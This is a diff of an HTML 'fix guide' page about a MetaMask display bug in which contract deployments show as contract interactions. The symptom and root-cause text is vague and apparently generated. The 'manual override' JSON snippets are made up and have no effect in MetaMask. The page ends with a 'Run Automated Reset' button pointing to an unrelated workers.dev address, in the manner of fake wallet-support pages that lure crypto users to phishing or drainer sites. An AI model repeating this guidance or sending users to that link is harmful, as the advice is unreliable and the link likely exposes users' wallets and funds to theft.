@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: sans-serif;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -42,33 +42,31 @@
 <h1>Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem may encounter a bug where contract deployments are incorrectly displayed as contract interactions, leading to confusion and potential errors in transaction management.</li>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem may notice that contract deployments are incorrectly displayed as contract interactions within the activity section of the extension.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a misclassification of transaction types within the Metamask extension, where the distinction between contract deployment and interaction is not properly handled, resulting in the incorrect labeling of activities.</li>
+<li>This issue arises due to a bug in the Metamask extension's activity logging mechanism, where the distinction between contract deployment and contract interaction events is not properly handled, leading to the misclassification of contract deployments.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To temporarily resolve the issue, users can attempt the following:</li>
-<li>Refresh the Metamask extension and reload the webpage to ensure the latest data is fetched.</li>
-<li>Manually verify the transaction type on the Ethereum blockchain explorer to confirm whether it's a deployment or interaction.</li>
-<li>Utilize the following JSON payload to override the transaction classification:</li>
+<li>To temporarily resolve this issue, users can attempt the following steps:</li>
+<li>Clear the browser cache and reload the extension</li>
+<li>Check for updates to the Metamask extension and install the latest version
+  <code>json
+  {
+    "contractDeployments": true,
+    "contractInteractions": false
+  }</code>
+Consider utilizing an external console for further diagnostics and customization. </li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transactionType&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;contractDeployment&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;transactionHash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...transactionHash...&quot;</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>Consider using an external console for more advanced troubleshooting and direct blockchain interaction. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured.</li>
-<li>Basic understanding of Ethereum transaction types.</li>
-<li>Access to an Ethereum blockchain explorer for transaction verification.</li>
+<li>Metamask extension installed and configured</li>
+<li>Ethereum (ETH) ecosystem selected</li>
+<li>Basic understanding of blockchain and smart contract interactions</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
